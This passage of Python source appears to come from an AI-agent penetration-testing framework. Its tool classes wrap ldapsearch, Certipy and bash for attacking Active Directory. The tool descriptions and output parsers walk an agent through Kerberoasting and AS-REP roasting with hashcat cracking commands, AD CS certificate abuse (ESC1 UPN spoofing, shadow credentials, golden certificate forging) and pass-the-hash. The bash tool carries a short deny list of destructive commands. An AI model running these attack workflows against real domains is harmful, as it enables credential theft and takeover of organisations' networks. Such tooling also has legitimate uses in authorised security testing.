                else:
                    formatted.append(f"  {t}")
            formatted.extend(["", "NEXT STEPS:", "  • Save tickets to file", 
                           "  • Crack with: hashcat -m 13100 tickets.txt wordlist.txt"])

        if not spns and not tickets:
            formatted.extend(["", "RAW OUTPUT:", output])

        formatted.extend(["", "─" * 80])
        return "\n".join(formatted)

    def _parse_asrep(self, output: str, cmd_display: str) -> str:
        """Parse GetNPUsers (AS-REP Roasting) output"""
        formatted = [f"Command: {cmd_display}", "", "AS-REP ROASTING RESULTS:", "─" * 80]

        asrep_hashes = []
        vuln_users = []
        
        for line in output.split("\n"):
            if "$krb5asrep$" in line:
                asrep_hashes.append(line.strip())
            elif "DONT_REQUIRE_PREAUTH" in line or "does not require" in line.lower():
                vuln_users.append(line.strip())

        if vuln_users:
            formatted.extend(["", f"VULNERABLE USERS (no preauth required) ({len(vuln_users)}):"])
            formatted.extend(f"  {u}" for u in vuln_users)

        if asrep_hashes:
            formatted.extend(["", f"AS-REP HASHES CAPTURED ({len(asrep_hashes)}):"])
            for h in asrep_hashes:
                if len(h) > 150:
                    formatted.append(f"  {h[:150]}...")
                else:
                    formatted.append(f"  {h}")
            formatted.extend(["", "NEXT STEPS:", "  • Save hashes to file",
                           "  • Crack with: hashcat -m 18200 asrep.txt wordlist.txt"])

        if not asrep_hashes and not vuln_users:
            formatted.extend(["", "RAW OUTPUT:", output])

        formatted.extend(["", "─" * 80])
        return "\n".join(formatted)

    def _parse_lookupsid(self, output: str, cmd_display: str) -> str:
        """Parse lookupsid output"""
        formatted = [f"Command: {cmd_display}", "", "SID LOOKUP RESULTS:", "─" * 80]

        users = []
        groups = []
        
        for line in output.split("\n"):
            if "(SidTypeUser)" in line:
                users.append(line.strip())
            elif "(SidTypeGroup)" in line or "(SidTypeAlias)" in line:
                groups.append(line.strip())

        if users:
            formatted.extend(["", f"USERS FOUND ({len(users)}):"])
            formatted.extend(f"  {u}" for u in users[:50])
            if len(users) > 50:
                formatted.append(f"  ... and {len(users) - 50} more")

        if groups:
            formatted.extend(["", f"GROUPS FOUND ({len(groups)}):"])
            formatted.extend(f"  {g}" for g in groups[:30])

        if not users and not groups:
            formatted.extend(["", "RAW OUTPUT:", output])

        formatted.extend(["", "─" * 80])
        return "\n".join(formatted)


class LdapsearchInput(BaseModel):
    """Input for ldapsearch LDAP queries"""

    target: str = Field(description="LDAP server IP or hostname (usually Domain Controller)")
    base_dn: Optional[str] = Field(
        default=None,
        description="Base DN for search (e.g., 'DC=corp,DC=local'). Auto-detected if not provided."
    )
    query_type: Optional[str] = Field(
        default=None,
        description="Preset query: 'users', 'computers', 'groups', 'admins', 'dcs', 'spns', 'asrep', 'unconstrained', 'gpos', 'trusts', 'all'"
    )
    filter: Optional[str] = Field(
        default=None,
        description="Custom LDAP filter (e.g., '(objectClass=user)', '(&(objectClass=user)(adminCount=1))')"
    )
    attributes: Optional[str] = Field(
        default=None,
        description="Attributes to return (comma-separated, e.g., 'cn,sAMAccountName,memberOf'). Use '*' for all."
    )
    username: Optional[str] = Field(
        default=None,
        description="Username for authentication (DOMAIN\\user or user@domain.local)"
    )
    password: Optional[str] = Field(
        default=None,
        description="Password for authentication"
    )
    anonymous: bool = Field(
        default=False,
        description="Attempt anonymous bind (no credentials)"
    )
    use_ssl: bool = Field(
        default=False,
        description="Use LDAPS (port 636) instead of LDAP (port 389)"
    )
    page_size: int = Field(
        default=1000,
        description="Page size for large result sets"
    )


class LdapsearchTool(BaseTool):
    """Tool for LDAP enumeration using ldapsearch"""

    name: str = "ldapsearch"
    description: str = """
    Query Active Directory via LDAP using ldapsearch for enumeration.
    
    Use this when you need to:
    - Enumerate domain users, groups, computers
    - Find privileged accounts (Domain Admins, adminCount=1)
    - Discover service accounts with SPNs (Kerberoastable)
    - Find AS-REP roastable accounts (no preauth)
    - Enumerate Group Policy Objects (GPOs)
    - Find domain trusts
    - Find unconstrained delegation
    - Custom LDAP queries
    
    PRESET QUERIES (use query_type parameter):
    - users: All user accounts
    - computers: All computer accounts
    - groups: All groups
    - admins: Users with adminCount=1 (privileged)
    - dcs: Domain Controllers
    - spns: Users with SPNs (Kerberoastable)
    - asrep: Users without preauth (AS-REP roastable)
    - unconstrained: Accounts with unconstrained delegation
    - gpos: Group Policy Objects
    - trusts: Domain trusts
    - all: Basic domain enumeration
    
    AUTHENTICATION:
    - Authenticated: Provide username and password
    - Anonymous: Set anonymous=True (limited results)
    - Username formats: DOMAIN\\user, user@domain.local, or just user
    
    EXAMPLES:
    
    # Enumerate all users (authenticated)
    target="192.168.56.10", query_type="users", username="CORP\\user", password="pass"
    
    # Find Kerberoastable accounts
    target="192.168.56.10", query_type="spns", username="user@corp.local", password="pass"
    
    # Find AS-REP roastable accounts
    target="192.168.56.10", query_type="asrep", username="CORP\\user", password="pass"
    
    # Find Domain Admins
    target="192.168.56.10", query_type="admins", username="user@corp.local", password="pass"
    
    # Custom query for disabled accounts
    target="192.168.56.10", filter="(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))",
    attributes="cn,sAMAccountName", username="user", password="pass"
    
    # Anonymous enumeration attempt
    target="192.168.56.10", query_type="users", anonymous=True
    
    # Query with SSL
    target="192.168.56.10", query_type="users", username="user", password="pass", use_ssl=True
    """
    args_schema: type[BaseModel] = LdapsearchInput

    # Preset LDAP filters for common AD queries
    QUERY_PRESETS: ClassVar[Dict[str, tuple]] = {
        "users": (
            "(objectClass=user)",
            "cn,sAMAccountName,distinguishedName,memberOf,userAccountControl,description"
        ),
        "computers": (
            "(objectClass=computer)",
            "cn,sAMAccountName,dNSHostName,operatingSystem,operatingSystemVersion"
        ),
        "groups": (
            "(objectClass=group)",
            "cn,sAMAccountName,description,member,distinguishedName"
        ),
        "admins": (
            "(&(objectClass=user)(adminCount=1))",
            "cn,sAMAccountName,memberOf,description,distinguishedName"
        ),
        "dcs": (
            "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))",
            "cn,sAMAccountName,dNSHostName,operatingSystem"
        ),
        "spns": (
            "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
            "cn,sAMAccountName,servicePrincipalName,memberOf"
        ),
        "asrep": (
            "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            "cn,sAMAccountName,distinguishedName"
        ),
        "unconstrained": (
            "(userAccountControl:1.2.840.113556.1.4.803:=524288)",
            "cn,sAMAccountName,distinguishedName,objectClass"
        ),
        "gpos": (
            "(objectClass=groupPolicyContainer)",
            "cn,displayName,gPCFileSysPath"
        ),
        "trusts": (
            "(objectClass=trustedDomain)",
            "cn,trustPartner,trustDirection,trustType,trustAttributes"
        ),
        "all": (
            "(objectClass=*)",
            "cn,sAMAccountName,objectClass"
        ),
    }

    def _run(
        self,
        target: str,
        base_dn: Optional[str] = None,
        query_type: Optional[str] = None,
        filter: Optional[str] = None,
        attributes: Optional[str] = None,
        username: Optional[str] = None,
        password: Optional[str] = None,
        anonymous: bool = False,
        use_ssl: bool = False,
        page_size: int = 1000,
    ) -> str:
        """Execute ldapsearch query"""

        # Determine filter and attributes
        ldap_filter = filter
        attrs = attributes

        if query_type and query_type.lower() in self.QUERY_PRESETS:
            preset_filter, preset_attrs = self.QUERY_PRESETS[query_type.lower()]
            if not ldap_filter:
                ldap_filter = preset_filter
            if not attrs:
                attrs = preset_attrs

        if not ldap_filter:
            ldap_filter = "(objectClass=*)"

        # Build ldapsearch command
        cmd = ["ldapsearch", "-x"]  # -x for simple authentication

        # LDAP URI
        if use_ssl:
            cmd.extend(["-H", f"ldaps://{target}:636"])
        else:
            cmd.extend(["-H", f"ldap://{target}:389"])

        # Authentication
        if not anonymous and username and password:
            # Handle different username formats
            bind_dn = username
            if "\\" in username:
                # DOMAIN\user format - convert to user@domain style or keep as is
                pass
            elif "@" not in username and base_dn:
                # Plain username - try to construct UPN
                domain = base_dn.replace("DC=", "").replace(",", ".")
                bind_dn = f"{username}@{domain}"

            cmd.extend(["-D", bind_dn])
            cmd.extend(["-w", password])

        # Base DN (try to auto-detect from target if not provided)
        if base_dn:
            cmd.extend(["-b", base_dn])
        else:
            # Try to query rootDSE first to get defaultNamingContext
            # For now, user should provide base_dn
            cmd.extend(["-b", ""])  # Root DSE query

        # Page size for large results
        cmd.extend(["-E", f"pr={page_size}/noprompt"])

        # Add filter
        cmd.append(ldap_filter)

        # Add attributes
        if attrs:
            cmd.extend(attrs.replace(" ", "").split(","))

        # Add sudo if configured (ldapsearch usually doesn't need sudo, but keeping consistent)
        # Note: ldapsearch typically doesn't require sudo
        # if self.config and self.config.use_sudo and "ldapsearch" in self.config.sudo_tools:
        #     cmd = ["sudo"] + cmd

        # Format command for display (mask password)
        cmd_display = " ".join(cmd)
        if password:
            cmd_display = cmd_display.replace(password, "***")

        # Ask for confirmation if configured
        if self.config and self.config.confirm_commands:
            if not confirm_execution(cmd_display, "ldapsearch"):
                return "Command skipped by user"

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=120,  # 2 minute timeout
            )

            output = result.stdout + result.stderr

            if not output.strip():
                return f"Command: {cmd_display}\n\nNo output - check connectivity and credentials"

            return self._parse_ldap_output(output, cmd_display, query_type)

        except subprocess.TimeoutExpired:
            return f"Command: {cmd_display}\n\nLDAP query timed out after 2 minutes"
        except FileNotFoundError:
            return "ldapsearch not installed. Install with:\n  sudo apt install ldap-utils  # Debian/Ubuntu\n  brew install openldap  # macOS"
        except Exception as e:
            return f"Error running ldapsearch: {str(e)}"

    def _parse_ldap_output(self, output: str, cmd_display: str, query_type: Optional[str]) -> str:
        """Parse and format ldapsearch output"""

        formatted = []
        formatted.append(f"Command: {cmd_display}")
        formatted.append("")
        
        query_label = query_type.upper() if query_type else "LDAP"
        formatted.append(f"{query_label} ENUMERATION RESULTS:")
        formatted.append("─" * 80)

        # Parse LDIF output
        entries = []
        current_entry = {}
        
        for line in output.split("\n"):
            line = line.strip()
            
            # Skip comments and empty lines
            if not line or line.startswith("#"):
                continue
            
            # New entry marker
            if line.startswith("dn:"):
                if current_entry:
                    entries.append(current_entry)
                current_entry = {"dn": line[3:].strip()}
            elif ":" in line and current_entry:
                key, _, value = line.partition(":")
                key = key.strip()
                value = value.strip()
                
                # Handle multi-valued attributes
                if key in current_entry:
                    if isinstance(current_entry[key], list):
                        current_entry[key].append(value)
                    else:
                        current_entry[key] = [current_entry[key], value]
                else:
                    current_entry[key] = value

        # Don't forget the last entry
        if current_entry:
            entries.append(current_entry)

        # Format based on query type
        if entries:
            formatted.append("")
            formatted.append(f"ENTRIES FOUND: {len(entries)}")
            formatted.append("")

            # Show entries with relevant fields
            for i, entry in enumerate(entries[:100], 1):  # Limit to 100 entries
                if "sAMAccountName" in entry:
                    name = entry.get("sAMAccountName", "")
                    cn = entry.get("cn", "")
                    formatted.append(f"  [{i}] {name} ({cn})")
                    
                    # Show extra info based on query type
                    if query_type == "spns" and "servicePrincipalName" in entry:
                        spns = entry["servicePrincipalName"]
                        if isinstance(spns, list):
                            for spn in spns[:3]:
                                formatted.append(f"      SPN: {spn}")
                        else:
                            formatted.append(f"      SPN: {spns}")
                    
                    if query_type == "computers" and "operatingSystem" in entry:
                        formatted.append(f"      OS: {entry.get('operatingSystem', 'Unknown')}")
                    
                    if query_type == "admins" and "memberOf" in entry:
                        groups = entry["memberOf"]
                        if isinstance(groups, list):
                            formatted.append(f"      Groups: {len(groups)} memberships")
                        else:
                            formatted.append(f"      Group: {groups[:60]}...")
                            
                elif "cn" in entry:
                    formatted.append(f"  [{i}] {entry.get('cn', 'Unknown')}")
                elif "dn" in entry:
                    formatted.append(f"  [{i}] {entry.get('dn', '')[:80]}")

            if len(entries) > 100:
                formatted.append(f"  ... and {len(entries) - 100} more entries")

        else:
            # Check for errors
            if "Invalid credentials" in output or "invalid credentials" in output.lower():
                formatted.append("")
                formatted.append("ERROR: Invalid credentials")
            elif "Can't contact LDAP server" in output:
                formatted.append("")
                formatted.append("ERROR: Cannot connect to LDAP server")
            else:
                formatted.append("")
                formatted.append("No entries found or error occurred")
                formatted.append("")
                formatted.append("RAW OUTPUT:")
                formatted.append(output[:2000])

        # Add tips based on query type
        if query_type:
            formatted.append("")
            formatted.append("─" * 80)
            if query_type == "spns":
                formatted.append("TIP: Found SPNs can be Kerberoasted with:")
                formatted.append("  impacket script='GetUserSPNs' ... extra_args='-request'")
            elif query_type == "asrep":
                formatted.append("TIP: These accounts can be AS-REP roasted with:")
                formatted.append("  impacket script='GetNPUsers' ... extra_args='-request'")
            elif query_type == "unconstrained":
                formatted.append("TIP: Unconstrained delegation can be abused for privilege escalation")
            elif query_type == "admins":
                formatted.append("TIP: These are high-value targets with adminCount=1")

        return "\n".join(formatted)


class CertipyInput(BaseModel):
    """Input for Certipy Active Directory certificate attacks"""

    action: str = Field(
        description="Certipy action: 'find', 'req', 'auth', 'shadow', 'account', 'ca', 'cert', 'forge', 'relay', 'template'"
    )
    target: Optional[str] = Field(
        default=None,
        description="Target DC IP or hostname (format: domain/username:password@target)"
    )
    username: Optional[str] = Field(
        default=None,
        description="Username for authentication (will be formatted as username@domain if domain is provided)"
    )
    password: Optional[str] = Field(
        default=None,
        description="Password for authentication"
    )
    domain: Optional[str] = Field(
        default=None,
        description="Domain name (e.g., 'corp.local') - will be appended to username as username@domain"
    )
    dc_ip: Optional[str] = Field(
        default=None,
        description="Domain Controller IP address"
    )
    hashes: Optional[str] = Field(
        default=None,
        description="NTLM hashes for pass-the-hash (format: 'LM:NT' or ':NT')"
    )
    ca: Optional[str] = Field(
        default=None,
        description="Certificate Authority name (for req, template actions)"
    )
    template: Optional[str] = Field(
        default=None,
        description="Certificate template name (for req action)"
    )
    upn: Optional[str] = Field(
        default=None,
        description="User Principal Name to request certificate for"
    )
    dns: Optional[str] = Field(
        default=None,
        description="DNS name for certificate (for computer account attacks)"
    )
    pfx: Optional[str] = Field(
        default=None,
        description="PFX certificate file for authentication"
    )
    pfx_password: Optional[str] = Field(
        default=None,
        description="PFX certificate password"
    )
    output: Optional[str] = Field(
        default=None,
        description="Output file for results (JSON, TXT, ZIP)"
    )
    extra_args: Optional[str] = Field(
        default=None,
        description="Additional certipy arguments (e.g., '-vulnerable', '-old-bloodhound', '-enabled')"
    )


class CertipyTool(BaseTool):
    """Tool for Active Directory certificate abuse using Certipy"""

    name: str = "certipy"
    description: str = """
    Abuse Active Directory Certificate Services (AD CS) using Certipy for various certificate-based attacks.
    
    When to use this tool:
    - Certipy tool is to be always used instead of suggesting bash equivalents.
    
    NOTE: Uses certipy v5.0.4+ syntax:
    - Username format: username@domain (e.g., 'user@corp.local') - NO separate -domain flag
    - Authentication flags: -u <username@domain> -p <password> -dc-ip <ip>

    MAIN ACTIONS:
    
    1. ENUMERATION & RECONNAISSANCE:
       - find: Enumerate certificate templates, CAs, and identify vulnerabilities
         Example: action="find", domain="corp.local", username="user", password="pass", dc_ip="192.168.1.10"
         Extra: extra_args="-vulnerable" (only show vulnerable templates)
                extra_args="-old-bloodhound" (output for BloodHound)
                extra_args="-enabled" (only enabled templates)
    
    2. CERTIFICATE REQUEST (ESC1, ESC2, ESC3):
       - req: Request a certificate from a template
         Example: action="req", domain="corp.local", username="user", password="pass", 
                  ca="corp-DC-CA", template="User", dc_ip="192.168.1.10"
         For ESC1 (UPN spoofing): upn="administrator@corp.local"
         For computer accounts: dns="dc.corp.local"
    
    3. AUTHENTICATION WITH CERTIFICATE:
       - auth: Authenticate using a PFX certificate to get NTLM hash/TGT
         Example: action="auth", pfx="administrator.pfx", dc_ip="192.168.1.10", domain="corp.local"
    
    4. SHADOW CREDENTIALS (ESC4):
       - shadow: Add shadow credentials to target account (requires write privileges)
         Example: action="shadow", domain="corp.local", username="user", password="pass",
                  target="DC$", dc_ip="192.168.1.10", extra_args="add"
         Then: action="shadow", extra_args="auto" (automatically auth with shadow creds)
    
    5. GOLDEN CERTIFICATE (ESC5):
       - ca: Dump CA certificate and private key (requires admin on CA)
         Example: action="ca", domain="corp.local", username="Administrator", password="pass",
                  ca="corp-DC-CA", dc_ip="192.168.1.10"
       - forge: Forge golden certificate (after dumping CA key)
         Example: action="forge", ca_pfx="corp-DC-CA.pfx", upn="Administrator@corp.local",
                  extra_args="-subject 'CN=Administrator,CN=Users,DC=corp,DC=local'"
    
    6. ACCOUNT CREATION (ESC6):
       - account: Create/modify accounts via certificates
         Example: action="account", domain="corp.local", pfx="user.pfx"
    
    7. TEMPLATE MANAGEMENT:
       - template: Manage certificate templates (requires CA admin)
         Example: action="template", domain="corp.local", username="admin", password="pass",
                  ca="corp-DC-CA", extra_args="list"
    
    COMMON AD CS ESCALATION PATHS (ESC):
    - ESC1: Template allows SAN (Subject Alternative Name) - request cert for any user
    - ESC2: Template allows any purpose - can be used for authentication
    - ESC3: Enrollment agent templates - request certificates on behalf of others
    - ESC4: Write access to template/account - modify template or add shadow credentials
    - ESC5: Vulnerable CA configuration - extract CA key, forge golden certificates
    - ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag - SAN specification in any template
    - ESC7: Vulnerable CA access control - modify CA to enable attacks
    - ESC8: NTLM relay to AD CS HTTP endpoints
    
    AUTHENTICATION METHODS:
    - Password: username + password + domain + dc_ip
    - Pass-the-Hash: username + hashes + domain + dc_ip
    - Certificate: pfx + pfx_password (for auth action)
    
    TYPICAL ATTACK WORKFLOW:
    1. Find vulnerable templates: action="find", extra_args="-vulnerable"
    2. Request certificate with ESC1: action="req", ca="...", template="...", upn="administrator@domain"
    3. Authenticate with certificate: action="auth", pfx="administrator.pfx"
    4. Use obtained NTLM hash or TGT for further attacks
    
    OUTPUT:
    - JSON files contain detailed enumeration data
    - PFX files are certificates for authentication
    - ZIP files contain CA backups
    - Use output parameter to specify custom output filename
    """
    args_schema: type[BaseModel] = CertipyInput

    def _run(
        self,
        action: str,
        target: Optional[str] = None,
        username: Optional[str] = None,
        password: Optional[str] = None,
        domain: Optional[str] = None,
        dc_ip: Optional[str] = None,
        hashes: Optional[str] = None,
        ca: Optional[str] = None,
        template: Optional[str] = None,
        upn: Optional[str] = None,
        dns: Optional[str] = None,
        pfx: Optional[str] = None,
        pfx_password: Optional[str] = None,
        output: Optional[str] = None,
        extra_args: Optional[str] = None,
    ) -> str:
        """Execute Certipy action"""

        # Valid actions
        valid_actions = [
            "find", "req", "auth", "shadow", "account", 
            "ca", "cert", "forge", "relay", "template"
        ]
        
        if action not in valid_actions:
            return f"Invalid action '{action}'. Valid options: {', '.join(valid_actions)}"

        # Build certipy command
        cmd = ["certipy", action]

        # Authentication using flags (certipy v5.0.4+ syntax)
        # Note: Domain is part of username, not a separate flag
        if action not in ["auth", "forge", "cert"]:
            # Add username (with domain if provided)
            if username:
                # Format username with domain if domain is provided and not already in username
                if domain and "@" not in username and "\\" not in username:
                    formatted_username = f"{username}@{domain}"
                else:
                    formatted_username = username
                cmd.extend(["-u", formatted_username])
            
            # Add password or hashes
            if password and not hashes:
                cmd.extend(["-p", password])
            elif hashes:
                cmd.extend(["-hashes", hashes])
            
            # Add DC IP
            if dc_ip:
                cmd.extend(["-dc-ip", dc_ip])
            elif target and not dc_ip:
                # If target is provided without dc_ip, use target as dc_ip
                cmd.extend(["-dc-ip", target])
        else:
            # For auth, forge, cert actions which have different syntax
            if dc_ip:
                cmd.extend(["-dc-ip", dc_ip])

        # Action-specific parameters
        if ca:
            cmd.extend(["-ca", ca])
        
        if template:
            cmd.extend(["-template", template])
        
        if upn:
            cmd.extend(["-upn", upn])
        
        if dns:
            cmd.extend(["-dns", dns])

        # Certificate-based authentication
        if pfx:
            cmd.extend(["-pfx", pfx])
            if pfx_password:
                cmd.extend(["-pfx-password", pfx_password])

        # Output file
        if output:
            cmd.extend(["-output", output])
        elif action in ["find", "req", "shadow", "ca"]:
            # Auto-generate output filename for actions that produce files
            cmd.extend(["-output", f"certipy_{action}"])

        # Extra arguments
        if extra_args:
            try:
                extra_list = shlex.split(extra_args)
                cmd.extend(extra_list)
            except ValueError:
                cmd.extend(extra_args.split())

        # Format command for display (mask password)
        cmd_display = " ".join(cmd)
        if password:
            cmd_display = cmd_display.replace(f":{password}@", ":***@")

        # Ask for confirmation if configured
        if self.config and self.config.confirm_commands:
            if not confirm_execution(cmd_display, "certipy"):
                return "Command skipped by user"

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300,  # 5 minute timeout
            )

            output_text = result.stdout + result.stderr

            if not output_text.strip():
                return f"Command: {cmd_display}\n\nNo output - check credentials and target"

            return self._format_output(output_text, cmd_display, action)

        except subprocess.TimeoutExpired:
            return f"Command: {cmd_display}\n\nTimeout after 5 minutes"
        except FileNotFoundError:
            return "Certipy not installed. Install with:\n  pipx install certipy-ad\n  # or\n  pip install certipy-ad"
        except Exception as e:
            return f"Error running certipy: {str(e)}"

    def _format_output(self, output: str, cmd_display: str, action: str) -> str:
        """Format Certipy output with command and structured sections"""

        formatted = []
        formatted.append(f"Command: {cmd_display}")
        formatted.append("")
        formatted.append(f"CERTIPY [{action.upper()}] RESULTS:")
        formatted.append("─" * 80)

        # Action-specific parsing
        if action == "find":
            return self._parse_find(output, cmd_display)
        elif action == "req":
            return self._parse_req(output, cmd_display)
        elif action == "auth":
            return self._parse_auth(output, cmd_display)
        elif action == "shadow":
            return self._parse_shadow(output, cmd_display)
        else:
            # Generic output formatting
            formatted.append("")
            formatted.append(output)
            formatted.append("")
            formatted.append("─" * 80)
            return "\n".join(formatted)

    def _parse_find(self, output: str, cmd_display: str) -> str:
        """Parse certipy find output"""
        formatted = [f"Command: {cmd_display}", "", "CERTIFICATE ENUMERATION RESULTS:", "─" * 80]

        cas = []
        templates = []
        vulnerable = []
        
        for line in output.split("\n"):
            line_stripped = line.strip()
            
            if "Certificate Authorities" in line or "CA Name" in line:
                cas.append(line_stripped)
            elif "Certificate Templates" in line or "Template Name" in line:
                templates.append(line_stripped)
            elif any(x in line for x in ["ESC1", "ESC2", "ESC3", "ESC4", "ESC5", "ESC6", "ESC7", "ESC8"]):
                vulnerable.append(line_stripped)

        if cas:
            formatted.extend(["", "CERTIFICATE AUTHORITIES:"])
            formatted.extend(f"  {ca}" for ca in cas[:20])

        if templates:
            formatted.extend(["", f"CERTIFICATE TEMPLATES ({len(templates)}):"])
            formatted.extend(f"  {t}" for t in templates[:30])

        if vulnerable:
            formatted.extend(["", f"VULNERABLE TEMPLATES ({len(vulnerable)}):"])
            formatted.extend(f"  ⚠️  {v}" for v in vulnerable)
            formatted.extend(["", "NEXT STEPS:",
                           "  • Identify the ESC (Escalation Scenario) number",
                           "  • Use 'req' action to request certificate from vulnerable template",
                           "  • Use 'auth' action to authenticate with obtained certificate"])
        
        # Always show key parts of raw output
        formatted.extend(["", "FULL OUTPUT:", output[:3000]])
        if len(output) > 3000:
            formatted.append("... (truncated)")

        formatted.append("─" * 80)
        return "\n".join(formatted)

    def _parse_req(self, output: str, cmd_display: str) -> str:
        """Parse certipy req output"""
        formatted = [f"Command: {cmd_display}", "", "CERTIFICATE REQUEST RESULTS:", "─" * 80]

        pfx_files = []
        errors = []
        
        for line in output.split("\n"):
            if ".pfx" in line.lower() and "saved" in line.lower():
                pfx_files.append(line.strip())
            elif "error" in line.lower() or "failed" in line.lower() or "denied" in line.lower():
                errors.append(line.strip())

        if pfx_files:
            formatted.extend(["", "SUCCESS - CERTIFICATE OBTAINED:"])
            formatted.extend(f"  ✓ {f}" for f in pfx_files)
            formatted.extend(["", "NEXT STEPS:",
                           "  • Use 'auth' action with the PFX file to get NTLM hash/TGT",
                           "  • Example: certipy auth -pfx <file>.pfx -dc-ip <DC_IP>"])
        
        if errors:
            formatted.extend(["", "ERRORS:"])
            formatted.extend(f"  ✗ {e}" for e in errors)

        formatted.extend(["", "FULL OUTPUT:", output])
        formatted.append("─" * 80)
        return "\n".join(formatted)

    def _parse_auth(self, output: str, cmd_display: str) -> str:
        """Parse certipy auth output"""
        formatted = [f"Command: {cmd_display}", "", "CERTIFICATE AUTHENTICATION RESULTS:", "─" * 80]

        hashes = []
        tgt = []
        
        for line in output.split("\n"):
            if "NTLM" in line or ":::" in line:
                hashes.append(line.strip())
            elif ".ccache" in line or "TGT" in line:
                tgt.append(line.strip())

        if hashes:
            formatted.extend(["", "NTLM HASHES OBTAINED:"])
            formatted.extend(f"  ✓ {h}" for h in hashes)
            formatted.extend(["", "NEXT STEPS:",
                           "  • Use hash for pass-the-hash attacks",
                           "  • Example: impacket script='psexec' hashes='<hash>' target='<target>'"])
        
        if tgt:
            formatted.extend(["", "KERBEROS TGT OBTAINED:"])
            formatted.extend(f"  ✓ {t}" for t in tgt)
            formatted.extend(["", "NEXT STEPS:",
                           "  • Export KRB5CCNAME=<file>.ccache",
                           "  • Use TGT for Kerberos attacks"])

        formatted.extend(["", "FULL OUTPUT:", output])
        formatted.append("─" * 80)
        return "\n".join(formatted)

    def _parse_shadow(self, output: str, cmd_display: str) -> str:
        """Parse certipy shadow credentials output"""
        formatted = [f"Command: {cmd_display}", "", "SHADOW CREDENTIALS RESULTS:", "─" * 80]

        formatted.extend(["", "FULL OUTPUT:", output])
        
        if "added" in output.lower():
            formatted.extend(["", "NEXT STEPS:",
                           "  • Use 'shadow' with 'auto' to authenticate",
                           "  • Or use 'auth' action with generated PFX"])

        formatted.append("─" * 80)
        return "\n".join(formatted)


class BashExecutionInput(BaseModel):
    """Input for bash command execution"""

    command: str = Field(description="Bash command to execute")
    reason: str = Field(description="Explanation of why this command is needed")


class BashExecutionTool(BaseTool):
    """Tool for executing bash commands (use with caution)"""

    name: str = "bash_execute"
    description: str = """
    Execute simple bash commands for tasks not covered by specialized tools.
    
    IMPORTANT: Keep commands simple and single-line. No heredocs or multi-line scripts.
    
    Use this ONLY when:
    - You need to parse/filter output from other tools
    - You need to check if a tool is installed
    - You need to perform simple file operations (cat, ls, grep)
    - You need to save output to a file
    
    DO NOT use for:
    - Network scanning (use nmap instead)
    - SMB/WinRM enumeration (use netexec instead)
    - LDAP enumeration (use ldapsearch instead)
    - Impacket tools (use impacket instead)
    - Password cracking (use hashcat instead)
    - Complex multi-line commands or scripts
    
    Always provide a clear 'reason' for why the command is needed.
    """
    args_schema: type[BaseModel] = BashExecutionInput

    def _run(self, command: str, reason: str) -> str:
        """Execute bash command"""

        # Safety check - block dangerous commands
        dangerous = ["rm -rf", "dd if=", "mkfs", ":(){:|:&};:", "fork"]
        if any(d in command.lower() for d in dangerous):
            return f"BLOCKED: Command appears dangerous. Reason given: {reason}"

        # Add sudo if configured (for bash, this would be dangerous but user controls it)
        # Note: Not adding auto-sudo to bash for security reasons
        # if self.config and self.config.use_sudo and "bash" in self.config.sudo_tools:
        #     command = f"sudo {command}"

        # Ask for confirmation if configured
        if self.config and self.config.confirm_commands:
            if not confirm_execution(command, "bash"):
                return "Command skipped by user"

        try:
            result = subprocess.run(
                command, shell=True, capture_output=True, text=True, timeout=60
            )

            output = result.stdout + result.stderr
            return f"[Command: {command}]\n[Reason: {reason}]\n\nOutput:\n{output}"

        except subprocess.TimeoutExpired:
            return "Command timed out after 60 seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"


# Tool registry - these are template instances
_TOOL_CLASSES = {
    "nmap": NmapScanTool,
    "netexec": NetExecTool,
    "impacket": ImpacketTool,
    "ldapsearch": LdapsearchTool,
    "hashcat": HashcatTool,
    "certipy": CertipyTool,
    "bash": BashExecutionTool,
}


def get_tools(tool_names: List[str], config = None) -> List[BaseTool]:
    """Get tool instances by name, with optional config
    
    Creates new instances each time to avoid shared state between calls.
    """
    tools = []
    for name in tool_names:
        if name in _TOOL_CLASSES:
            # Create a new instance of the tool
            tool = _TOOL_CLASSES[name]()
            # Set config as a regular attribute (not a Pydantic field)
            object.__setattr__(tool, 'config', config)
            tools.append(tool)
    return tools
